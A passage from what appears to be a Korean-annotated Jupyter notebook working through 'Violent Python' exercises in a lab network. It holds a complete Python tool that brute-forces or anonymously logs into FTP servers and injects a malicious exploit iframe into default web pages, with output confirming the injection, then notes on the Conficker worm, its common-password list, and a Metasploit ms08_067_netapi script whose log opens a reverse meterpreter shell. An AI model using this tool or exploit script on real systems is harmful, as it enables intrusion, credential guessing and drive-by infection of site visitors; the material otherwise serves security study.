      "            ':' +\\\n",
      "            str(port) +\\\n",
      "            '/exploit\"></iframe>'\n",
      "injectPage(ftp, 'index.html', redirect)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "error_perm",
       "evalue": "530 Login incorrect.",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[0;31merror_perm\u001b[0m                                Traceback (most recent call last)",
        "\u001b[0;32m<ipython-input-31-eaf98c23de81>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     17\u001b[0m \u001b[0mpassWord\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'toor'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     18\u001b[0m \u001b[0mftp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mftplib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mFTP\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 19\u001b[0;31m \u001b[0mftp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mlogin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0muserName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpassWord\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     20\u001b[0m \u001b[0mredirect\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'<iframe src='\u001b[0m \u001b[0;34m+\u001b[0m            \u001b[0;34m'\"http://'\u001b[0m \u001b[0;34m+\u001b[0m            \u001b[0mhost\u001b[0m \u001b[0;34m+\u001b[0m            \u001b[0;34m':'\u001b[0m \u001b[0;34m+\u001b[0m            \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mport\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m+\u001b[0m            \u001b[0;34m'/exploit\"></iframe>'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     21\u001b[0m \u001b[0minjectPage\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mftp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'index.html'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mredirect\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Applications/Canopy.app/appdata/canopy-1.3.0.1715.macosx-x86_64/Canopy.app/Contents/lib/python2.7/ftplib.pyc\u001b[0m in \u001b[0;36mlogin\u001b[0;34m(self, user, passwd, acct)\u001b[0m\n\u001b[1;32m    391\u001b[0m             \u001b[0mpasswd\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpasswd\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m'anonymous@'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    392\u001b[0m         \u001b[0mresp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msendcmd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'USER '\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0muser\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 393\u001b[0;31m         \u001b[0;32mif\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;34m'3'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mresp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msendcmd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'PASS '\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mpasswd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    394\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;34m'3'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mresp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msendcmd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'ACCT '\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0macct\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    395\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0;34m'2'\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Applications/Canopy.app/appdata/canopy-1.3.0.1715.macosx-x86_64/Canopy.app/Contents/lib/python2.7/ftplib.pyc\u001b[0m in \u001b[0;36msendcmd\u001b[0;34m(self, cmd)\u001b[0m\n\u001b[1;32m    247\u001b[0m         \u001b[0;34m'''Send a command and return the response.'''\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    248\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mputcmd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcmd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 249\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetresp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    250\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    251\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mvoidcmd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcmd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Applications/Canopy.app/appdata/canopy-1.3.0.1715.macosx-x86_64/Canopy.app/Contents/lib/python2.7/ftplib.pyc\u001b[0m in \u001b[0;36mgetresp\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    222\u001b[0m             \u001b[0;32mraise\u001b[0m \u001b[0merror_temp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    223\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mc\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;34m'5'\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 224\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0merror_perm\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    225\u001b[0m         \u001b[0;32mraise\u001b[0m \u001b[0merror_proto\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresp\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    226\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;31merror_perm\u001b[0m: 530 Login incorrect."
       ]
      }
     ],
     "prompt_number": 31
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib\n",
      "\n",
      "def injectPage(ftp, page, redirect):\n",
      "    f = open(page + '.tmp', 'w')\n",
      "    dirList = ftp.nlst()\n",
      "    print dirList\n",
      "    ftp.retrlines('RETR ' + page, f.write)\n",
      "    print '[+] Downloaded Page: ' + page\n",
      "    f.write(redirect)\n",
      "    f.close()\n",
      "    print '[+] Injected Malicious IFrame on: ' + page\n",
      "    ftp.storlines('STOR ' + page, open(page + '.tmp'))\n",
      "    print '[+] Uploaded Injected Page: ' + page\n",
      "\n",
      "redirect_host = '172.16.190.132'\n",
      "host = '172.16.190.132'\n",
      "# host = '192.168.10.94'\n",
      "port = 80\n",
      "userName = 'root'\n",
      "passWord = 'toor'\n",
      "\n",
      "userName = 'violent'\n",
      "passWord = 'violent'\n",
      "ftp = ftplib.FTP(host)\n",
      "ftp.login(userName, passWord)\n",
      "redirect = '<iframe src=' +\\\n",
      "            '\"http://' +\\\n",
      "            host +\\\n",
      "            ':' +\\\n",
      "            str(port) +\\\n",
      "            '/\"></iframe>'\n",
      "injectPage(ftp, 'index.html', redirect)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "['index.html', 'index.html.bak', 'test.html']\n",
        "[+] Downloaded Page: index.html\n",
        "[+] Injected Malicious IFrame on: index.html\n",
        "[+] Uploaded Injected Page: index.html\n"
       ]
      }
     ],
     "prompt_number": 32
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \ubaa8\ub4e0 \uacf5\uaca9 \ud1b5\ud569\ud558\uae30\n",
      "\n",
      "- \uc774\uc81c \uc774 \ubaa8\ub4e0 \uacf5\uaca9\uc744 attack() \ud568\uc218\uc5d0 \ud3ec\ud568\ud560 \uac83\n",
      "- attack(): \uc0ac\uc6a9\uc790 \uc774\ub984, \ud328\uc2a4\uc6cc\ub4dc, \ud3ec\uc2a4\ud2b8 \uc774\ub984, \ub9ac\ub2e4\uc774\ub809\ud2b8 \uc0ac\uc774\ud2b8\ub97c \uc785\ub825 \ubc1b\ub294\ub2e4.\n",
      "\n",
      "\n",
      "1. \uc774 \uc778\uc99d\uc815\ubcf4\ub97c \uac00\uc9c0\uace0 FTP \uc11c\ubc84\ub85c \ub85c\uadf8\uc778\n",
      "2. \uc2a4\ud06c\ub9bd\ud2b8\ub294 \ub514\ud3f4\ud2b8 \uc6f9 \ud398\uc774\uc9c0\ub97c \uac80\uc0c9\n",
      "3. \uc2a4\ud06c\ub9bd\ud2b8\ub294 \ub514\ud3f4\ud2b8 \ud398\uc774\uc9c0\ub97c \ub2e4\uc6b4\ub85c\ub4dc\n",
      "4. \ub514\ud3f4\ud2b8 \ud398\uc774\uc9c0\uc5d0 \uc545\uc131 \ub9ac\ub2e4\uc774\ub809\ud2b8 \ucd94\uac00\n",
      "5. \uc2a4\ud06c\ub9bd\ud2b8\ub294 \uac10\uc5fc\ub41c \ud398\uc774\uc988\ub97c \ub2e4\uc2dc FTP \uc11c\ubc84\uc5d0 \uc5c5\ub85c\ub4dc"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def attack(username, password, tgtHost, redirect):\n",
      "    ftp = ftplib.FTP(tgtHost)\n",
      "    ftp.login(username, password)\n",
      "    defPages = returnDefault(ftp)\n",
      "    for defPage in defPages:\n",
      "        injectPage(ftp, defPage, redirect)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 33
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uc774\uc81c \uc635\uc158 \ucc98\ub9ac \uba87 \uac1c\ub97c \ucd94\uac00\ud558\uace0 \uc2a4\ud06c\ub9bd\ud2b8\ub97c \uc815\ub9ac\n",
      "- \uba3c\uc800 FTP \uc11c\ubc84\uc5d0 \uc811\uc18d\ud560 \uc218 \uc788\ub294\uc9c0 \uc2dc\ub3c4\n",
      "- \ub9cc\uc57d \uc2e4\ud328\ud558\uba74 \uc778\uc99d\uc815\ubcf4\ub97c \ud68d\ub4dd\ud558\uae30 \uc704\ud574 \uacf5\uaca9\uc744 \ud558\uace0, \uc778\uc99d\uc815\ubcf4\ub97c \ubc1c\uacac\ud558\uba74 \uc774 \uc815\ubcf4\ub97c \ubc14\ud0d5\uc73c\ub85c \uacf5\uaca9\uc744 \uc2e4\ud589\n",
      "- \ubb3c\ub860 \uc774 \uc2a4\ud06c\ub9bd\ud2b8\ub294 100\uc904 \uc815\ub3c4 \ubc16\uc5d0 \ub418\uc9c0 \uc54a\uc9c0\ub9cc k985ytv\uac00 \uc0ac\uc6a9\ud558\uc600\ub358 \uacf5\uaca9 \ubca1\ud130\ub97c \uc644\ubcbd\ud558\uac8c \uc7ac\ud604"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib\n",
      "import optparse\n",
      "import time\n",
      "\n",
      "def anonLogin(hostname):\n",
      "    try:\n",
      "        ftp = ftplib.FTP(hostname)\n",
      "        ftp.login('anonymous', 'me@your.com')\n",
      "        print '\\n[*] ' + str(hostname) +\\\n",
      "        ' FTP Anonymous Logon Succeeded.'\n",
      "        ftp.quit()\n",
      "        return True\n",
      "    except Exception, e:\n",
      "        print '\\n[-] ' + str(hostname) +\\\n",
      "        ' FTP Anonymous Logon Failed.'\n",
      "        return False\n",
      "    \n",
      "def bruteLogin(hostname, passwdFile):\n",
      "    pF = open(passwdFile, 'r')\n",
      "    for line in pF:\n",
      "        time.sleep(1)\n",
      "        userName = line.split(':')[0]\n",
      "        passWord = line.split(':')[1].strip('\\r').strip('\\n')\n",
      "        print '[+] Trying: ' + userName + '/' + passWord\n",
      "        try:\n",
      "            ftp = ftplib.FTP(hostname)\n",
      "            ftp.login(userName, passWord)\n",
      "            print '\\n[*] ' + str(hostname) +\\\n",
      "            ' FTP Logon Succeeded: ' + userName + '/' + passWord\n",
      "            ftp.quit()\n",
      "            return(userName, passWord)\n",
      "        except Exception, e:\n",
      "            pass\n",
      "    print '\\n[-] Could not brute force FTP credentials.'\n",
      "    return(None, None)\n",
      "\n",
      "def returnDefault(ftp):\n",
      "    try:\n",
      "        dirList = ftp.nlst()\n",
      "    except:\n",
      "        dirList = []\n",
      "        print '[-] Could not list directory contents.'\n",
      "        print '[-] Skipping To Next Target.'\n",
      "        return\n",
      "    retList = []\n",
      "    for fileName in dirList:\n",
      "        fn = fileName.lower()\n",
      "        if '.php' in fn or \\\n",
      "        '.htm' in fn or \\\n",
      "        '.asp' in fn:\n",
      "            print '[+] Found default page: ' + fileName\n",
      "        retList.append(fileName)\n",
      "    return retList\n",
      "\n",
      "def injectPage(ftp, page, redirect):\n",
      "    f = open(page + '.tmp', 'w')\n",
      "    ftp.retrlines('RETR ' + page, f.write)\n",
      "    print '[+] Downloaded Page: ' + page\n",
      "    f.write(redirect)\n",
      "    f.close()\n",
      "    print '[+] Injected Malicious IFrame on: ' + page\n",
      "    ftp.storlines('STOR ' + page, open(page + '.tmp'))\n",
      "    print '[+] Uploaded Injected Page: ' + page\n",
      "    \n",
      "def attack(username, password, tgtHost, redirect):\n",
      "    ftp = ftplib.FTP(tgtHost)\n",
      "    ftp.login(username, password)\n",
      "    defPages = returnDefault(ftp)\n",
      "    for defPage in defPages:\n",
      "        injectPage(ftp, defPage, redirect)\n",
      "        \n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage%prog ' +\\\n",
      "                                   '-H <target host[s]> ' +\\\n",
      "                                   '-r <redirect page>' +\\\n",
      "                                   '[-f <userpass file>]')\n",
      "    parser.add_option('-H', dest='tgtHosts', type='string', \\\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-f', dest='passwdFile', type='string', \\\n",
      "                      help='specify user/password file')\n",
      "    parser.add_option('-r', dest='redirect', type='string', \\\n",
      "                      help='specify a redirection page')\n",
      "    (options, args) = parser.parse_args()\n",
      "    tgtHosts = str(options.tgtHosts).split(',')\n",
      "    passwdFile = options.passwdFile\n",
      "    redirect = options.redirect\n",
      "    if tgtHosts == None or redirect == None:\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "    for tgtHost in tgtHosts:\n",
      "        username = None\n",
      "        password = None\n",
      "        if anonLogin(tgtHost) == True:\n",
      "            username = 'anonymous'\n",
      "            password = 'me@your.com'\n",
      "            print '[+] Using Anonymous Creds to attack'\n",
      "            attack(username, password, tgtHost, redirect)\n",
      "        elif passwdFile:\n",
      "            (username, password) = bruteLogin(tgtHost, passwdFile)\n",
      "        if password:\n",
      "            print '[+] Using Creds: ' +\\\n",
      "            username +\\\n",
      "            '/' +\\\n",
      "            password +\\\n",
      "            ' to attack'\n",
      "            attack(username, password, tgtHost, redirect)\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "Usage: usage-c -H <target host[s]> -r <redirect page>[-f <userpass file>]\n",
        "\n",
        "-c: error: no such option: --pylab\n"
       ]
      },
      {
       "ename": "SystemExit",
       "evalue": "2",
       "output_type": "pyerr",
       "traceback": [
        "An exception has occurred, use %tb to see the full traceback.\n",
        "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "To exit: use 'exit', 'quit', or Ctrl-D.\n"
       ]
      }
     ],
     "prompt_number": 35
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### 553 Could not create file.\n",
      "\n",
      "- \ud30c\uc77c \uc4f0\uae30 \uad8c\ud55c\uc774 \uc5c6\uc5b4\uc11c \uadf8\ub807\ub2e4.\n",
      "> chmod 646 *.html\n",
      "- html \ud30c\uc77c \ubaa8\ub450 \uc77d\uae30, \uc4f0\uae30 \uad8c\ud55c\uc744 \uc8fc\uba74 \ub41c\ub2e4."
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "## \ucee8\ud53c\ucee4, \ub178\ub825\ud558\uba74 \ub41c\ub2e4.\n",
      "\n",
      "- 2008\ub144 11\uc6d4, \uac8c\uc784\uc758 \ub8f0\uc744 \ubc14\uafb8\ub294 \uc6dc\uc744 \ubc1c\uacac\n",
      "- \ucee8\ud53c\ucee4 \ub610\ub294 W32DownandUp \uc774\ub77c \ubd88\ub9ac\ub294 \uc774 \uc6dc\uc740 \ub108\ubb34\ub098\ub3c4 \uae09\uc18d\ub3c4\ub85c \uc804\ud30c\ub418\uc5b4 200\uc5ec\uac1c\uad6d\uc5d0\uc11c 5\ubc31\ub9cc\ub300\uc758 \ucef4\ud4e8\ud130\ub97c \uac10\uc5fc\uc2dc\ud0b4(Markoff, 2009).\n",
      "- \uc77c\ubd80 \uace0\uae09 \uae30\ubc95(\ub514\uc9c0\ud138 \uc11c\uba85, \uc554\ud638\ud654\ub41c \ud398\uc774\ub85c\ub4dc, \uc5bc\ud130\ub108\ud2f0\ube0c \uc804\ud30c \uae30\ubc95)\uc774 \uacf5\uaca9\uc5d0 \ub3c4\uc6c0\uc744 \uc8fc\uc5c8\uc9c0\ub9cc, \ucee8\ud53c\ucee4\uc758 \ud575\uc2ec\uc5d0\ub294 1988\ub144\ub300\uc758 \ubaa8\ub9ac\uc2a4 \uc6dc\uc774 \uc0ac\uc6a9\ud558\uc600\ub358 \uacf5\uaca9 \ubca1\ud130\uc640 \ub9e4\uc6b0 \uc720\uc0ac\ud55c \uae30\ubc95\uc774 \uc0ac\uc6a9\ub428\n",
      "- \ucee8\ud53c\ucee4\ub294 2\uac1c\uc758 \uc11c\ub85c \ub2e4\ub978 \ubca1\ud130\ub97c \uc0ac\uc6a9\ud558\uc5ec \uacf5\uaca9\n",
      "\n",
      "\n",
      "1. \ucee8\ud53c\ucee4\ub294 \uc708\ub3c4\uc6b0 \uc11c\ubc84 \uc11c\ube44\uc2a4\uc5d0 \uc788\ub294 \uc81c\ub85c \ub370\uc774(zero-day) \ucde8\uc57d\uc810\uc744 \ud65c\uc6a9\ud588\ub2e4.\n",
      "2. \uc774 \ucde8\uc57d\uc810\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc2a4\ud0dd\uc744 \ubcc0\uc870\ud558\uc5ec \uc258\ucf54\ub4dc\ub97c \uc2e4\ud589\uc2dc\ud0a4\uace0, \uac10\uc5fc\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc790\uc2e0\uc758 \ubcf5\uc0ac\ubcf8\uc744 \ub2e4\uc6b4\ub85c\ub4dc\ud558\ub3c4\ub85d \ud588\ub2e4.\n",
      "3. \uc774 \uacf5\uaca9\ubc29\ubc95\uc774 \uc2e4\ud328\ud558\uba74, \ub514\ud3f4\ud2b8 \uad00\ub9ac\uc790 \ub124\ud2b8\uc6cc\ud06c \uacf5\uc720(ADMIN$)\uc758 \uacc4\uc815\uc5d0 \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc744 \ud558\uc5ec \uc811\uadfc \uad8c\ud55c\uc744 \ud68d\ub4dd\ud558\ub824\uace0 \ud588\ub2e4."
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### \ud328\uc2a4\uc6cc\ub4dc \uacf5\uaca9\n",
      "\n",
      "- \ucee8\ud53c\ucee4 \uc6dc\uc740 \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ud558\ub294 250\uac1c\uc758 \ud328\uc2a4\uc6cc\ub4dc\ub97c \uacf5\uaca9\uc5d0 \uc0ac\uc6a9\ud588\uace0, \ubaa8\ub9ac\uc2a4 \uc6dc\uc740 432\uac1c\uc758 \ud328\uc2a4\uc6cc\ub4dc\ub97c \uc0ac\uc6a9\ud588\ub2e4. \uc774 \ub450 \uacf5\uaca9\uc740 \ub9e4\uc6b0 \uc131\uacf5\uc801\uc774\uc5c8\uc73c\uba70 11\uac1c\uc758 \uacf5\ud1b5\uc801\uc778 \ud328\uc2a4\uc6cc\ub4dc\uac00 \uc788\uc5c8\uc74c\n",
      "- aaa\n",
      "- academia\n",
      "- anything\n",
      "- coffee\n",
      "- computer\n",
      "- cookie\n",
      "- oracle\n",
      "- password\n",
      "- secret\n",
      "- super\n",
      "- unknown\n",
      "\n",
      "\n",
      "- \ud574\ucee4\ub4e4\uc740 \uc218 \ucc28\ub840\uc758 \uacf5\uaca9\uc744 \ud1b5\ud574 \ud655\ubcf4\ud55c \ud328\uc2a4\uc6cc\ub4dc \ub364\ud504\ub97c \uc778\ud130\ub137\uc5d0 \ubc30\ud3ec\n",
      "- \ud328\uc2a4\uc6cc\ub4dc \ub364\ud504\uac00 \ubcf4\uc548 \uc804\ubb38\uac00\uc5d0\uac8c\ub294 \ub9e4\uc6b0 \ud765\ubbf8\ub85c\uc6b4 \uc5f0\uad6c\uaebc\ub9ac\n",
      "- 2\uac1c\uc758 \ub300\ubb38\uc790, 2\uac1c\uc758 \ud2b9\uc218\ubb38\uc790, 2\uac1c\uc758 \uc22b\uc790"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc73c\ub85c \uc708\ub3c4\uc6b0 [SMB](http://ko.wikipedia.org/wiki/%EC%84%9C%EB%B2%84_%EB%A9%94%EC%8B%9C%EC%A7%80_%EB%B8%94%EB%A1%9D) \uc11c\ube44\uc2a4 \uacf5\uaca9\ud558\uae30\n",
      "\n",
      "- \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787 \ud504\ub808\uc784\uc6cc\ud06c\ub97c \uc0ac\uc6a9\ud560 \uac83\n",
      "- \uacf5\uaca9 \ud234 \uc138\uacc4\uc758 \ud669\uae08 \ud45c\uc900\n",
      "- \uc804\uc124\uc801\uc778 \ud574\ucee4\uc778 \ubb34\uc5b4\uac00 \uac1c\ubc1c\ud55c \uacf5\uaca9 \ud504\ub808\uc784\uc6cc\ud06c\ub85c\uc368, \uacf5\uaca9\ucf54\ub4dc\ub97c \ud45c\uc900\ud654\ub418\ub3c4\ub85d \ud558\uba70 \ud55c \ubc88\uc5d0 \uc218\ucc9c \uac1c\uc758 \ucef4\ud4e8\ud130\ub97c \ub300\uc0c1\uc73c\ub85c \uacf5\uaca9\uc744 \ud560 \uc218\ub3c4 \uc788\uac8c \ud574\uc90c\n",
      "- \ucee8\ud53c\ucee4 \uc6dc: ms08-067_netapi \ub77c\uace0 \ub9cc\ub4e4\uc5b4\uc11c \ud504\ub808\uc784\uc6cc\ud06c\uc5d0 \ud1b5\ud569\n",
      "\n",
      "- \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc5d0\uc11c \uc0ac\uc6a9\uc790\uac00 \uba85\ub839\uc5b4\ub97c \uc785\ub825\ud558\uba74\uc11c \uacf5\uaca9\uc744 \uc2e4\ud589\ud560 \uc218\ub3c4 \uc788\uc9c0\ub9cc \ubc30\uce58 \ud30c\uc77c\uc744 \ud1b5\ud574 \uacf5\uaca9\ud558\ub294 \ubc29\ubc95\ub3c4 \uc788\uc74c\n",
      "- 192.168.13.37 \uc5d0 \uc788\ub294 \ud638\uc2a4\ud2b8\ub97c Confiker\ub85c \uacf5\uaca9\ud558\uc5ec \uc6b0\ub9ac\uc758 \ucef4\ud4e8\ud130\uc778 192.168.77.77\uc758 TCP \ud3ec\ud2b8 7777\ubc88\uc73c\ub85c \ub9ac\ubc84\uc2a4 \uc258\uc744 \uac00\uc9c0\uace0 \uc624\ub3c4\ub85d \ud560 \uac83"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    use exploit/windows/smb/ms08_067_netapi\n",
      "    set RHOST 172.16.190.133\n",
      "    set PAYLOAD windows/meterpreter/reverse_tcp\n",
      "    set LHOST 172.16.190.132\n",
      "    set LPORT 7777\n",
      "    exploit -j -z"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Using conficker.rc in Metasploit"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    root@bt:/home/violent# msfconsole -r conficker.rc \n",
      "\n",
      "\n",
      "    Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f\n",
      "    EFLAGS: 00010046\n",
      "    eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001\n",
      "    esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60\n",
      "    ds: 0018   es: 0018  ss: 0018\n",
      "    Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)\n",
      "\n",
      "\n",
      "    Stack: 90909090990909090990909090\n",
      "           90909090990909090990909090\n",
      "           90909090.90909090.90909090\n",
      "           90909090.90909090.90909090\n",
      "           90909090.90909090.09090900\n",
      "           90909090.90909090.09090900\n",
      "           ..........................\n",
      "           cccccccccccccccccccccccccc\n",
      "           cccccccccccccccccccccccccc\n",
      "           ccccccccc.................\n",
      "           cccccccccccccccccccccccccc\n",
      "           cccccccccccccccccccccccccc\n",
      "           .................ccccccccc\n",
      "           cccccccccccccccccccccccccc\n",
      "           cccccccccccccccccccccccccc\n",
      "           ..........................\n",
      "           ffffffffffffffffffffffffff\n",
      "           ffffffff..................\n",
      "           ffffffffffffffffffffffffff\n",
      "           ffffffff..................\n",
      "           ffffffff..................\n",
      "           ffffffff..................\n",
      "\n",
      "\n",
      "    Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N4 00 00 00 00\n",
      "    Aiee, Killing Interrupt handler\n",
      "    Kernel panic: Attempted to kill the idle task!\n",
      "    In swapper task - not syncing\n",
      "\n",
      "\n",
      "\n",
      "           =[ metasploit v4.5.0-dev [core:4.5 api:1.0]\n",
      "    + -- --=[ 927 exploits - 499 auxiliary - 151 post\n",
      "    + -- --=[ 251 payloads - 28 encoders - 8 nops\n",
      "\n",
      "    [*] Processing conficker.rc for ERB directives.\n",
      "    resource (conficker.rc)> use exploit/windows/smb/ms08_067_netapi\n",
      "    resource (conficker.rc)> set RHOST 172.16.190.134\n",
      "    RHOST => 172.16.190.134\n",
      "    resource (conficker.rc)> set PAYLOAD windows/meterpreter/reverse_tcp\n",
      "    PAYLOAD => windows/meterpreter/reverse_tcp\n",
      "    resource (conficker.rc)> set LHOST 172.16.190.132\n",
      "    LHOST => 172.16.190.132\n",
      "    resource (conficker.rc)> set LPORT 7777\n",
      "    LPORT => 7777\n",
      "    resource (conficker.rc)> exploit -j -z\n",
      "    [*] Exploit running as background job.\n",
      "\n",
      "    [*] Started reverse handler on 172.16.190.132:7777 \n",
      "    msf  exploit(ms08_067_netapi) > [*] Automatically detecting the target...\n",
      "    [*] Fingerprint: Windows XP - Service Pack 3 - lang:Korean\n",
      "    [*] Selected Target: Windows XP SP3 Korean (NX)\n",
      "    [*] Attempting to trigger the vulnerability...\n",
      "    [*] Sending stage (752128 bytes) to 172.16.190.134\n",
      "    [*] Meterpreter session 1 opened (172.16.190.132:7777 -> 172.16.190.134:1729) at 2014-06-20 13:44:42 -0400\n",
      "\n",
      "    msf  exploit(ms08_067_netapi) > sessions -i 1\n",
      "    [*] Starting interaction with 1...\n",
      "\n",
      "    meterpreter > execute -i -f cmd.exe\n",
      "    Process 3384 created.\n",
      "    Channel 1 created.\n",
      "    Microsoft Windows XP [Version 5.1.2600]\n",
      "    (C) Copyright 1985-2001 Microsoft Corp.\n",
      "\n",
      "    C:\\WINDOWS\\system32>ipconfig\n",
      "    ipconfig\n",
      "\n",
      "    Windows IP Configuration\n",
      "\n",
      "\n",
